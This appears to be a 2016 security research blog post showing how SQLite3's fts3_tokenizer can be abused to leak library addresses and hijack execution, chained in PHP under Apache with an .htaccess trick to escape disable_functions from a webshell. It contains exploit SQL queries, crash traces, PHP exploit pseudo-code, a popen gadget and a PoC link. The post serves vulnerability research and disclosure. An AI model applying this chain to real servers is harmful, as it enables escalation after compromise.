---
layout:	post
title:	"Bypass PHP Safe Mode by Abusing SQLite3's FTS Tokenizer"
date:	2016-01-20
image: /img/bad-tokenizer.png
show_excerpt: true
---

As a pentester, once you own a webshell you may need to get more access by running extra programs. But `disable_functions` may stop you from invoking system commands and probably `open_basedir` was set as well. PHP doesn't actually have a sandbox, so these restrictions have no effect on native code. If there were a bug that leads to code execution, the access control policies are broken. For example, [this exploit](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/writeup.md) abuses an use after free bug to bypass them.

<!-- more -->

## Backgrounds

SQLite3 has a function called `fts3_tokenizer` to register custom tokenizers for full-text search. The FTS3 and FTS4 extension modules allows users to create special tables with a built-in full-text index (hereafter "FTS tables"). The full-text index allows the user to efficiently query the database for all rows that contain one or more words (hereafter "tokens"), even if the table contains many large documents.[1]

To implement full-text search in SQLite3, create a virtual index table, insert records to it to build index, then search keywords with `MATCH` clause. Both indexing and searching requires tokenization. By default SQLite uses its built-in **simple** tokenizer. Developers can also implement their own tokenizers to support languages other than English.

A custom FTS3 tokenizer should implement the following callbacks:

* `xCreate`: initialization
* `xDestroy`: destructor
* `xOpen`: create a new tokenize cursor from a user input
* `xClose`: close the cursor
* `xNext`: yield next word

These callbacks are registered in a `sqlite3_tokenizer_module` struct, declared as follow:

```c
struct sqlite3_tokenizer_module {
 int iVersion;
 int (*xCreate) (int argc, const char * const *argv, sqlite3_tokenizer **ppTokenizer);
 int (*xDestroy) (sqlite3_tokenizer *pTokenizer);
 int (*xOpen) (sqlite3_tokenizer *pTokenizer, const char *pInput, int nBytes, sqlite3_tokenizer_cursor **ppCursor);
 int (*xClose) (sqlite3_tokenizer_cursor *pCursor);
 int (*xNext) (sqlite3_tokenizer_cursor *pCursor, const char **ppToken, int *pnBytes, int *piStartOffset, int *piEndOffset, int *piPosition);
};
```

When the tokenizer is ready, we should register it to the SQLite.

> FTS does not expose a C-function that users call to register new tokenizer types with a database handle. Instead, the pointer must be encoded as an SQL blob value and passed to FTS through the SQL engine by evaluating a special scalar function, `fts3_tokenizer()`. The `fts3_tokenizer()` function may be called with one or two arguments, as follows: `SELECT fts3_tokenizer(<tokenizer-name>);
SELECT fts3_tokenizer(<tokenizer-name>, <sqlite3_tokenizer_module ptr>)`;
> Where is a string identifying the tokenizer and is a pointer to an `sqlite3_tokenizer_module` structure encoded as an SQL blob. If the second argument is present, it is registered as tokenizer and a copy of it returned. If only one argument is passed, a pointer to the tokenizer implementation currently registered as is returned, encoded as a blob. Or, if no such tokenizer exists, an SQL exception (error) is raised.[1]You may notice that there's a security warning in SQLite's official document. Actually we can abuse `fts3_tokenizer` to execute arbitrary code, and even break a modern system protection.

## Leak the Module Base

SQLite3 has a few built-in tokenizers, like **simple**, **porter** and **unicode61**. The query below returns a hex string represents a big-endian address:

```sql
select hex(fts3_tokenizer('simple'));
```

In [ext/fts3/fts3.c](https://github.com/mackyle/sqlite/blob/c37ab9dfdd94a60a3b9051d2ef54ea766c5d227a/ext/fts3/fts3.c#L5876-L5877) it loads the built-in tokenizers into a hash table. The address comes from `libsqlite3`'s `.bss` section and refers to this:

```c
static const sqlite3_tokenizer_module simpleTokenizerModule = {
 0,
 simpleCreate,
 simpleDestroy,
 simpleOpen,
 simpleClose,
 simpleNext,
};
```

So a simple SQL query breaks the ASLR.

![fts3_tokenizer_leak](/img/sqlite3-aslr.jpeg)

## Arbitrary Code Execution via Callbacks

The following queries will crash sqlite3 REPL (for 32bit, use `x'41414141'` instead):

```sql
select fts3_tokenizer('mytokenizer', x'4141414141414141');
create virtual table a using fts3(tokenize=mytokenizer);
```

Use a debugger to view the context:

```
[---------------------code---------------------]
RAX: 0x4141414141414141 (b'AAAAAAAA')
RBX: 0x0
RCX: 0x0
RDX: 0x7fffffffc620 --> 0x0
RSI: 0x0
RDI: 0x0
RBP: 0x0
RSP: 0x7fffffffc4e0 --> 0x3
RIP: 0x7ffff7bab71c (call QWORD PTR [rax+0x8])
R8 : 0x55555579b968 --> 0x656c706d6973 (b'simple')
R9 : 0x0
R10: 0x0
R11: 0x1
R12: 0x0
R13: 0x8
R14: 0x7fffffffc514 --> 0x2e1ef00000000006
R15: 0x555555799f78 --> 0x7ffff7bb39e4 --> 0x746e65746e6f63 (b'content')
[---------------------code---------------------]
 0x7ffff7bab712: mov edi,ebx
 0x7ffff7bab714: mov rdx,QWORD PTR [rsp+0x10]
 0x7ffff7bab719: mov rsi,r12
=> 0x7ffff7bab71c: call QWORD PTR [rax+0x8]
 0x7ffff7bab71f: test eax,eax
 0x7ffff7bab721: mov ebx,eax
 0x7ffff7bab723: jne 0x7ffff7bab790
 0x7ffff7bab725: mov rax,QWORD PTR [rsp+0x10]

```

`RAX` is the second parameter from `fts3_tokenizer`. SQLite3 called the `xCreate` callback with no validation and caused the segment fault. This refers to `sqlite3Fts3InitTokenizer` in `ext/fts3/fts3_tokenizer.c`.

```c
 m = (sqlite3_tokenizer_module *)sqlite3Fts3HashFind(pHash,z,(int)strlen(z)+1);
 if( !m ){
 sqlite3Fts3ErrMsg(pzErr, "unknown tokenizer: %s", z);
 rc = SQLITE_ERROR;
 }else{
 char const **aArg = 0;

 //...lines omitted...

 rc = m->xCreate(iArg, aArg, ppTok);
 assert( rc!=SQLITE_OK || *ppTok );
 if( rc!=SQLITE_OK ){
 sqlite3Fts3ErrMsg(pzErr, "unknown tokenizer");
```

Assume the virtual table named *fulltext* has already been created successfully. This query triggers `xOpen` callback with the string "text goes here" as the `pInput1` parameter:

```
insert into fulltext values("text goes here");
```

Sources in `ext/fts3/fts3_expr.c`, function `sqlite3Fts3OpenTokenizer`:

```c
sqlite3_tokenizer_module const *pModule = pTokenizer->pModule;
sqlite3_tokenizer_cursor *pCsr = 0;
int rc;**rc = pModule->xOpen(pTokenizer, z, n, &pCsr);
```

So we can craft a target address on a predictable memory location, pass the location to `fts3_tokenizer`, trigger the callback, then program counter is hijacked. Yep! It can be a global variable in `.bss` segment, or use the heap spray technique.

[Commit e36e9c](https://github.com/mackyle/sqlite/commit/e36e9c520a7fa35c2dd46eb92aee7822580132e0) introduced the `soft_heap` pragma for limiting the size of heap memory pool. It accepts a 64-bit number set the global variable `mem0.alarmThreshold` to the given value. This global variable's address can be calculated from previously leaked `simpleTokenizer`.

The pseudo code to describe the exploit:

```php
$big_endian_address = sqlQuery("select hex(fts3_tokenizer('simple)) addr")['addr'];
$leaked_address = big_endian_to_cpu_endian($big_endian_address);
$libsqlite3_base = $leaked_address - $simple_tokenizer_offset;
$alarm_threshold = $libsqlite3_base + $threshold_offset;
$target = 0xdeadbeefdeadbeef;
$off_by_one = $is_64_bit ? 8 : 4;
$crafted = $alarm_threshold - $off_by_one;
$big_endian_address = cpu_endian_to_big_endian($crafted);
sqlQuery("select fts3_tokenizer('simple', ?);", $big_endian_address);
sqlQuery("create table a using fts3"); // crash
```

## Exploiting PHP

The SQLite3 extension is enabled by default as of PHP 5.3.0. It's possible to disable it by using `--without-sqlite3` at compile time.[2] The extension is compiled with FTS so there's an attack surface. We don't even have to create a file since SQLite supports in-memory database.

PHP does not come with PIE, but apache2 does. PHP interpreter is loaded as a shared object (`mod_php.so`) in Apache2's worker processes, who have full protection enabled.

> CANARY : ENABLED
> FORTIFY : ENABLED
> NX : ENABLED
> PIE : ENABLED
> RELRO : FULL

Without a proper gadget for stack pivoting, sadly I only have one chance to call. *xOpen* looks good for PC-control. Its second param is a string from SQL which can be fully controlled.

```c
int (*xOpen) (sqlite3_tokenizer *pTokenizer, const char *pInput, int nBytes, sqlite3_tokenizer_cursor **ppCursor);
```

Here's a gadget to call `popen`:

```
.text:00000000002F137A mov rbx, rsi
.text:00000000002F137D lea rsi, aRbLR+5 ; modes
.text:00000000002F1384 sub rsp, 58h
.text:00000000002F1388 mov [rsp+88h+var_74], edi
.text:00000000002F138C mov rdi, rbx ; command
.text:00000000002F138F mov [rsp+88h+var_58], rdx
.text:00000000002F1394 mov rax, fs:28h
.text:00000000002F139D mov [rsp+88h+var_40], rax
.text:00000000002F13A2 xor eax, eax
.text:00000000002F13A4 mov [rsp+88h+var_50], rcx
.text:00000000002F13A9 mov [rsp+88h+var_48], 0
.text:00000000002F13B2 call _popen
```

To set both `xCreate` and `xOpen`, we need at least 3 continuous QWORDs to be controllable. But the *PRAGMA* clause only sets one. Heap spray fits the need, except it can't always hit because of alignment. Sending multiply requests is acceptable, and it worked.

Another reliable way is to set PHP.ini entries. In almost every PHP module or extension's source we see the `ZEND_BEGIN_MODULE_GLOBALS` macro. It stores "global" variables per module scope, and these data are on .bss segment so their locations are predictable. Here's an example picked from [mysqlnd.h](https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd.h#L309):

```c
ZEND_BEGIN_MODULE_GLOBALS(mysqlnd)
 char * debug; /* The actual string */
 char * trace_alloc_settings; /* The actual string */
 MYSQLND_DEBUG * dbg; /* The DBG object for standard tracing */
 MYSQLND_DEBUG * trace_alloc; /* The DBG object for allocation tracing */
 zend_long net_cmd_buffer_size;
 zend_long net_read_buffer_size;
 zend_long log_mask;
 zend_long net_read_timeout;
 zend_long mempool_default_size;
 zend_long debug_emalloc_fail_threshold;
 zend_long debug_ecalloc_fail_threshold;
 zend_long debug_erealloc_fail_threshold;
 zend_long debug_malloc_fail_threshold;
 zend_long debug_calloc_fail_threshold;
 zend_long debug_realloc_fail_threshold;
 char * sha256_server_public_key;
 zend_bool fetch_data_copy;
 zend_bool collect_statistics;
 zend_bool collect_memory_statistics;
ZEND_END_MODULE_GLOBALS(mysqlnd)
```

The type `zend_long` is an alias for int64 on 64bit system, now we can craft the module struct by manipulating php.ini entries. In most cases the function `ini_set` is disabled, but this could be bypass once the httpd.conf enables *AllowOverride*.

When using PHP as an Apache module, you can also change the configuration settings using directives in Apache configuration files (e.g. httpd.conf) and `.htaccess` files. You will need "AllowOverride Options" or "AllowOverride All" privileges to do so.

There are several Apache directives that allow you to change the PHP configuration from within the Apache configuration files. For a listing of which directives are `PHP_INI_ALL`, `PHP_INI_PERDIR`, or `PHP_INI_SYSTEM`, have a look at the [List of php.ini directives](http://php.net/manual/en/ini.list.php) appendix. [3]

Since we already have the permission to write and execute a webshell, it's not a problem to put another `.htaccess` file inside the same directory.

The exploit requires two requests. The former leak the address and generate a `.htaccess` file with directives to craft callback addresses. The later trigger system command by inserting into virtual table.

Here's the test environment.

> Linux ubuntu 3.19.0-44-generic #50-Ubuntu SMP Mon Jan 4 18:37:30 UTC 2016 x86_64
> Apache/2.4.10 (Ubuntu)
> PHP Version 5.6.4-4ubuntu6.4

POC source code:

https://github.com/chichou/badtokenizerpoc

Demo:

https://asciinema.org/a/7tj88jfqb0xg6bdnjsu427fkx

## References:

[1]. [SQLite FTS3 and FTS4 Extensions](https://sqlite.org/fts3.html#section_8_1)
[2]. [PHP: SQLite3 Installation](http://php.net/manual/en/sqlite3.installation.php)
[3]. [How to Change Configuration Settings](http://php.net/manual/en/configuration.changes.php)

中文版：[特性还是漏洞？滥用 SQLite 分词器](http://blog.chaitin.com/abusing_fts3_tokenizer/)

